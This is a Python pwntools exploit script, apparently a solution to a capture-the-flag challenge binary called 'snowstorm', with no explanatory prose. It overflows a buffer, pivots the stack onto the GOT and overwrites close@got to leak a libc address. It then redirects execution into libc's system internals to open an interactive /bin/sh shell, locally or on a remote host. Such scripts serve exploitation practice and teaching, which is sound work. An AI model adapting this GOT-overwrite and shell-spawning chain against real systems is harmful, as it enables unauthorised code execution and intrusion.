#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('snowstorm_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *pwnme+155
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    offset = 48

    close_got = exe.got["close"]
    call_puts = exe.sym["pwnme"] + 73
    strcspn = 0x401080
    read = 0x401090
    strtol = 0x4010a0
    sendfile = 0x4010b0
    open_ = 0x4010d0
    exit_ = 0x4010e0

    """
    Stack pivot to got:
    - Overwrite close() to call puts in pwnme()
    """

    payload = flat({
        offset: [
            close_got + 0x30,
            exe.sym["pwnme"] + 0x53
        ]
    })

    io.sendafter(b":", b"0x40")
    io.sendafter(b"> ", payload)

    # override close@got with `call puts` (rerun BOF)

    payload = flat(
        [
            call_puts,
            strcspn,
            read,
            strtol,
            sendfile,
            # this overrides `int fd`
            # when close(fd) is called we get puts(&puts@plt)
            exe.got["puts"] << 0x20,
            open_,
            exit_
        ]
    )

    io.sendafter(b":", b"0x40")
    io.sendafter(b">", payload)

    puts = u64(io.recvline()[1:].strip(b"\n").ljust(8, b"\x00"))
    libc.address = puts - libc.sym["puts"]
    info("libc base: %#x", libc.address)
    
    do_system = libc.address + 0x582c2
    payload = p64(do_system) + p64(0) * 4 + p64(exe.got["open"] << 0x20) + b"/bin/sh\0"

    io.sendafter(b"40): ", b"0x40")
    io.sendafter(b">", payload)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

